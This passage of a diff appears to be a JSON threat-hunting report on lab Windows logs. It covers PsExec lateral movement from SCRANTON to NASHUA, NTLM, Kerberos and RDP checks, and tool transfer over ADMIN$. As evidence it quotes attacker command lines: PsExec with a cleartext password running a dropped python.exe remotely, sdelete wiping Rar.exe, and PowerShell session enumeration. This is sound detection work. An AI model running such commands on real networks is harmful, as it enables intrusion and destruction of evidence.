+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "message",
+          "value": "Service Name:  PSEXESVC",
+          "query_id": "q-a392280f3a"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-4edda752cc"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niydsP",
+          "field": "win.TargetServerName",
+          "value": "NASHUA",
+          "query_id": "q-49cc0800a8"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRbzS",
+          "field": "process.command_line",
+          "value": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "query_id": "q-e5c4fd8202"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cri_p-",
+          "field": "process.command_line",
+          "value": ".\\sdelete64.exe  /accepteula \"C:\\Windows\\Temp\\Rar.exe\"",
+          "query_id": "q-4edda752cc"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-4edda752cc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "message",
+          "claimed": "Service Name:  PSEXESVC",
+          "query_id": "q-a392280f3a",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "A service was installed in the system.\r\n\r\nService Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-4edda752cc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-4376915466",
+            "q-ebede971ad",
+            "q-cd1a654ba3",
+            "q-4edda752cc"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:39.934Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niydsP",
+          "field": "win.TargetServerName",
+          "claimed": "NASHUA",
+          "query_id": "q-49cc0800a8",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ac9203fe22",
+            "q-6cbeef0102",
+            "q-2d13c1540d",
+            "q-ae8cd475a2",
+            "q-14a9d1c2b2"
+          ],
+          "actual": "NASHUA",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRbzS",
+          "field": "process.command_line",
+          "claimed": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "query_id": "q-e5c4fd8202",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ecb946390c",
+            "q-c1952cb2f9",
+            "q-52fdab0caf",
+            "q-d96d898469",
+            "q-e5c4fd8202"
+          ],
+          "actual": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "timestamp": "2020-05-01T23:09:23.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cri_p-",
+          "field": "process.command_line",
+          "claimed": ".\\sdelete64.exe  /accepteula \"C:\\Windows\\Temp\\Rar.exe\"",
+          "query_id": "q-4edda752cc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-762b97d6aa",
+            "q-cd1a654ba3",
+            "q-4edda752cc",
+            "q-cbae87ce01"
+          ],
+          "actual": ".\\sdelete64.exe  /accepteula \"C:\\Windows\\Temp\\Rar.exe\"",
+          "timestamp": "2020-05-02T03:16:52.456Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 6
+    },
+    {
+      "technique": "T1550.002",
+      "title": "Single NTLM network logon for pbeesly on SCRANTON — consistent with PsExec NTLM auth, no pass-the-hash evidence",
+      "assessment": "suspicious",
+      "confidence": "medium",
+      "summary": "Only one 4624 with AuthenticationPackageName NTLM exists in the whole window: pbeesly, LogonType 3, LogonProcessName 'NtLmSsp ', LmPackageName 'NTLM V2', KeyLength 128, on scranton.dmevals.local at 2020-05-01T23:20:41-04:00 (2020-05-02T03:20:41Z) from source 172.18.39.2 with WorkstationName 10.0.1.4. All other 217 network logons are Kerberos. This NTLM logon is temporally and account-wise consistent with the PsExec/alternate-credential activity by pbeesly, and the same source IP 172.18.39.2 also appears in a 4648 for pbeesly on scranton at 03:20:46Z. However, no credential-dumping precursor was found: no mimikatz/sekurlsa script blocks (C103 zero hits), and LSASS process-access events with high rights (0x1fffff) come only from csrss.exe, wininit.exe and PowerShell.exe on scranton with ordinary system call traces. The NTLM logon is therefore best explained by explicit-credential/NTLM fallback during the PsExec move rather than hash reuse; no pass-the-hash is confirmed.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.AuthenticationPackageName",
+          "value": "NTLM",
+          "query_id": "q-05e6c65792"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.LogonProcessName",
+          "value": "NtLmSsp ",
+          "query_id": "q-02ab91ba23"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.LmPackageName",
+          "value": "NTLM V2",
+          "query_id": "q-02ab91ba23"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v1",
+          "field": "source.ip",
+          "value": "172.18.39.2",
+          "query_id": "q-49cc0800a8"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hQQBhJ",
+          "field": "process.executable",
+          "value": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
+          "query_id": "q-f31e6158f1"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.AuthenticationPackageName",
+          "claimed": "NTLM",
+          "query_id": "q-05e6c65792",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-846ac30166",
+            "q-4ffcea3e4d",
+            "q-05e6c65792",
+            "q-02ab91ba23",
+            "q-252013a306"
+          ],
+          "actual": "NTLM",
+          "timestamp": "2020-05-01T23:20:41.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.LogonProcessName",
+          "claimed": "NtLmSsp ",
+          "query_id": "q-02ab91ba23",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-846ac30166",
+            "q-4ffcea3e4d",
+            "q-05e6c65792",
+            "q-02ab91ba23",
+            "q-252013a306"
+          ],
+          "actual": "NtLmSsp ",
+          "timestamp": "2020-05-01T23:20:41.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nQi3T7",
+          "field": "win.LmPackageName",
+          "claimed": "NTLM V2",
+          "query_id": "q-02ab91ba23",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-846ac30166",
+            "q-4ffcea3e4d",
+            "q-05e6c65792",
+            "q-02ab91ba23",
+            "q-252013a306"
+          ],
+          "actual": "NTLM V2",
+          "timestamp": "2020-05-01T23:20:41.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v1",
+          "field": "source.ip",
+          "claimed": "172.18.39.2",
+          "query_id": "q-49cc0800a8",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ac9203fe22",
+            "q-6cbeef0102",
+            "q-2d13c1540d",
+            "q-ae8cd475a2",
+            "q-14a9d1c2b2"
+          ],
+          "actual": "172.18.39.2",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hQQBhJ",
+          "field": "process.executable",
+          "claimed": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
+          "query_id": "q-f31e6158f1",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f31e6158f1",
+            "q-9811ff3817"
+          ],
+          "actual": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
+          "timestamp": "2020-05-02T03:05:16.654Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 5
+    },
+    {
+      "technique": "T1550.003",
+      "title": "No pass-the-ticket indicators: Kerberos tickets requested normally, no pre-auth-0 logons or ticket-injection tooling",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "Kerberos activity in the window is ordinary: 4769 service-ticket requests for pbeesly@DMEVALS.LOCAL from client 10.0.1.4 (scranton) to newyork.dmevals.local for krbtgt, NEWYORK$ and NASHUA$ services, each with a distinct Logon GUID and normal client ports — i.e. tickets being legitimately obtained, not replayed. The PreAuthType aggregation over Kerberos 4624 logons returned no buckets (no PreAuthType 0 / no-pre-auth logons), and the Rubeus/kirbi/asktgt script-block search returned zero hits. Network logons are dominated by machine accounts (NEWYORK$ 123, SCRANTON$ 37, NASHUA$ 25) plus pbeesly 20, which is normal domain traffic. No evidence of stolen or injected Kerberos tickets.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7njzKBN",
+          "field": "message",
+          "value": "Service Name:\t\tNASHUA$",
+          "query_id": "q-3ca792f6ba"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nq72Yx",
+          "field": "source.ip",
+          "value": "::ffff:10.0.1.4",
+          "query_id": "q-3ca792f6ba"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7njzKBN",
+          "field": "message",
+          "claimed": "Service Name:\t\tNASHUA$",
+          "query_id": "q-3ca792f6ba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-3ca792f6ba",
+            "q-3b5ac7b508"
+          ],
+          "actual": "A Kerberos service ticket was requested.\r\n\r\nAccount Information:\r\n\tAccount Name:\t\tpbeesly@DMEVALS.LOCAL\r\n\tAccount Domain:\t\tDMEVALS.LOCAL\r\n\tLogon GUID:\t\t{b7617a62-5f75-f17c-cfde-7d642b2d7ba3}\r\n\r\nService Information:\r\n\tService Name:\t\tNASHUA$\r\n\tService ID:\t\tS-1-5-21-1830255721-3727074217-2423397540-1112\r\n\r\nNetwork Information:\r\n\tClient Address:\t\t::ffff:10.0.1.4\r\n\tClient Port:\t\t59958\r\n\r\nAdditional Information:\r\n\tTicket Options:\t\t0x40810000\r\n\tTicket Encryption Type:\t0x12\r\n\tFailure Code:\t\t0x0\r\n\tTransited Services:\t-\r\n\r\nThis event is generated every time access is requested to a resource such as a co...(truncated)",
+          "timestamp": "2020-05-01T23:09:23.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nq72Yx",
+          "field": "source.ip",
+          "claimed": "::ffff:10.0.1.4",
+          "query_id": "q-3ca792f6ba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-3ca792f6ba",
+            "q-7054a00c11"
+          ],
+          "actual": "::ffff:10.0.1.4",
+          "timestamp": "2020-05-01T23:04:04.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 2
+    },
+    {
+      "technique": "T1563",
+      "title": "No remote service session hijacking observed; lateral movement used PsExec service execution instead",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "Hunting for T1563 (Remote Service Session Hijacking) produced no hijack evidence. The only remote-interactive (LogonType 10) logons in the window are two 4624 events on scranton.dmevals.local at 2020-05-02T03:20:46Z for DMEVALS\\pbeesly from 172.18.39.2 (LogonProcessName 'User32 ', WorkstationName SCRANTON, TargetLogonId 0x1305dc, Linked Logon ID 0x13069A). That session is a normal, freshly established RDP logon: TermService (svchost -k NetworkService -s TermService) spawned rdpclip.exe at 03:20:48Z in TerminalSessionId 2 with LogonId 0x13069A, followed by explorer.exe, LogonUI.exe, dwm.exe and fontdrvhost.exe — i.e. a new interactive desktop, not a takeover of an existing session. No tscon, mstsc, qwinsta or query session execution exists in sysmon process-creation events, and the 120 PowerShell 4104 'hits' for tscon/qwinsta/query session are false positives from built-in CimCmdlets module text (e.g. '[Alias('Session')] [CimSession[]] ${CimSession}') on newyork.dmevals.local, not attacker script. The real lateral movement in this window is PsExec-based (T1021.002), which is outside this technique family.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonType",
+          "value": "10",
+          "query_id": "q-04039f0deb"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonProcessName",
+          "value": "User32 ",
+          "query_id": "q-04039f0deb"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "process.command_line",
+          "value": "rdpclip",
+          "query_id": "q-2840f214ba"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "process.parent.command_line",
+          "value": "C:\\windows\\System32\\svchost.exe -k NetworkService -s TermService",
+          "query_id": "q-2840f214ba"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qvTSui",
+          "field": "win.ScriptBlockText",
+          "value": "[Alias('Session')]",
+          "query_id": "q-ad74212516"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonType",
+          "claimed": "10",
+          "query_id": "q-04039f0deb",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-deff16df7d",
+            "q-e010f19792",
+            "q-952eb3e252",
+            "q-fd172b755a",
+            "q-10e7d540a0"
+          ],
+          "actual": "10",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonProcessName",
+          "claimed": "User32 ",
+          "query_id": "q-04039f0deb",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-deff16df7d",
+            "q-e010f19792",
+            "q-952eb3e252",
+            "q-fd172b755a",
+            "q-10e7d540a0"
+          ],
+          "actual": "User32 ",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "process.command_line",
+          "claimed": "rdpclip",
+          "query_id": "q-2840f214ba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-0accbce800",
+            "q-2840f214ba",
+            "q-06b357391c",
+            "q-71e90ef013",
+            "q-b9e853f837"
+          ],
+          "actual": "rdpclip",
+          "timestamp": "2020-05-02T03:20:48.127Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "process.parent.command_line",
+          "claimed": "C:\\windows\\System32\\svchost.exe -k NetworkService -s TermService",
+          "query_id": "q-2840f214ba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-0accbce800",
+            "q-2840f214ba",
+            "q-06b357391c",
+            "q-71e90ef013",
+            "q-b9e853f837"
+          ],
+          "actual": "C:\\windows\\System32\\svchost.exe -k NetworkService -s TermService",
+          "timestamp": "2020-05-02T03:20:48.127Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qvTSui",
+          "field": "win.ScriptBlockText",
+          "claimed": "[Alias('Session')]",
+          "query_id": "q-ad74212516",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4447684e6e",
+            "q-ad74212516",
+            "q-a24ad81f2f"
+          ],
+          "actual": "erSetName='ByDisk')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByPhysicalDisk')]\r\n    [Parameter(ParameterSetName='ByDisk')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByPhysicalDisk')]\r\n    [Parameter(ParameterSetName='ByDisk')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n         ...(truncated)",
+          "timestamp": "2020-05-01T23:01:33.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 5
+    },
+    {
+      "technique": "T1563.002",
+      "title": "RDP session on scranton is a legitimate new interactive logon, not a hijacked session",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "The single RDP-related network event is a sysmon event.code 3 on scranton.dmevals.local at 2020-05-02T03:20:21Z: svchost.exe (PID 1056, NT AUTHORITY\\NETWORK SERVICE) receiving an inbound TCP connection from 172.18.39.2:60579 to 10.0.1.4:3389 (Initiated: false). It is immediately followed by the LogonType 10 4624 for pbeesly from 172.18.39.2 and by rdpclip.exe spawned from TermService in TerminalSessionId 2. There is no evidence of session takeover: no tscon.exe execution (C119 zero hits), no mstsc/ssh/winrs command lines (C114 zero hits), no Enter-PSSession/New-PSSession script blocks (C116 zero hits), and no second session being redirected to an existing one. The RDP session is the attacker's/user's own interactive foothold on scranton, from which the actual lateral movement to nashua.dmevals.local was performed with PsExec64.exe (cleartext -u dmevals\\pbeesly -p ... \\\\NASHUA -i 2 C:\\Windows\\Temp\\python.exe at 03:11:18Z, 03:12:25Z, 03:13:28Z, 03:14:42Z), creating PSEXESVC services and running python.exe on nashua — that is T1021.002, not RDP hijacking.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cdSewt",
+          "field": "destination.port",
+          "value": "3389",
+          "query_id": "q-17c8ec6556"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cdSewt",
+          "field": "win.Initiated",
+          "value": "false",
+          "query_id": "q-17c8ec6556"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "win.TerminalSessionId",
+          "value": "2",
+          "query_id": "q-2840f214ba"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03AIc",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-60f48e6e74"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-418abcd71e"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cdSewt",
+          "field": "destination.port",
+          "claimed": "3389",
+          "query_id": "q-17c8ec6556",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-ca33bcc6ad",
+            "q-809481db0a",
+            "q-17c8ec6556",
+            "q-11f392fd98"
+          ],
+          "actual": 3389,
+          "timestamp": "2020-05-02T03:20:21.001Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cdSewt",
+          "field": "win.Initiated",
+          "claimed": "false",
+          "query_id": "q-17c8ec6556",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-ca33bcc6ad",
+            "q-809481db0a",
+            "q-17c8ec6556",
+            "q-11f392fd98"
+          ],
+          "actual": "false",
+          "timestamp": "2020-05-02T03:20:21.001Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRfJfH5wFd7b_zvXB",
+          "field": "win.TerminalSessionId",
+          "claimed": "2",
+          "query_id": "q-2840f214ba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-0accbce800",
+            "q-2840f214ba",
+            "q-06b357391c",
+            "q-71e90ef013",
+            "q-b9e853f837"
+          ],
+          "actual": "2",
+          "timestamp": "2020-05-02T03:20:48.127Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03AIc",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-60f48e6e74",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-eedf0bc97a",
+            "q-10e292fc55",
+            "q-762b97d6aa",
+            "q-cd1a654ba3"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:12:25.384Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-418abcd71e",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-a559b1e79c",
+            "q-cf1e6614b3",
+            "q-762b97d6aa"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:40.213Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 5
+    },
+    {
+      "technique": "T1570",
+      "title": "PsExec tool transfer from SCRANTON to NASHUA via ADMIN$ share (PSEXESVC.exe + python.exe dropped)",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "User pbeesly (DMEVALS, SID ...-1107) on scranton.dmevals.local (10.0.1.4) repeatedly wrote tools into the ADMIN$ share (\\\\*\\ADMIN$ -> \\\\??\\C:\\windows) of nashua.dmevals.local. At 23:10:23 local (03:10:23Z) a 5145 event shows pbeesly writing 'Temp\\python.exe' with WriteData/AppendData access, and Sysmon event 11 on nashua confirms C:\\Windows\\Temp\\python.exe was created at 03:10:23.626Z. At 23:11:18 (03:11:18Z) pbeesly wrote 'PSEXESVC.exe' to ADMIN$ (WriteData/AppendData), and Sysmon recorded C:\\Windows\\PSEXESVC.exe created at 03:11:18.864Z, then executed as NT AUTHORITY\\SYSTEM with parent services.exe (Sysinternals PsExec v2.2, SHA256 224F549F...). This write-then-service-execute cycle repeated four times (PSEXESVC.exe created 03:11:18, 03:12:25, 03:13:28, 03:14:42Z), each followed ~20s later by a pbeesly-context C:\\Windows\\Temp\\python.exe process on nashua. The transferred python.exe then dropped further tools into C:\\Windows\\Temp on nashua: Rar.exe (03:15:31Z) and sdelete64.exe (03:15:38Z). This is attacker-driven lateral tool transfer from a compromised host to a new host, not normal administration.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.RelativeTargetName",
+          "value": "PSEXESVC.exe",
+          "query_id": "q-133ecfed5d"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.ShareName",
+          "value": "\\\\*\\ADMIN$",
+          "query_id": "q-133ecfed5d"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.IpAddress",
+          "value": "10.0.1.4",
+          "query_id": "q-133ecfed5d"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niytvL",
+          "field": "win.RelativeTargetName",
+          "value": "Temp\\python.exe",
+          "query_id": "q-cf7b110726"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03ALx",
+          "field": "win.TargetFilename",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-09e9733b73"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82-ha",
+          "field": "win.TargetFilename",
+          "value": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-a74fa56090"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-f416380fba"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
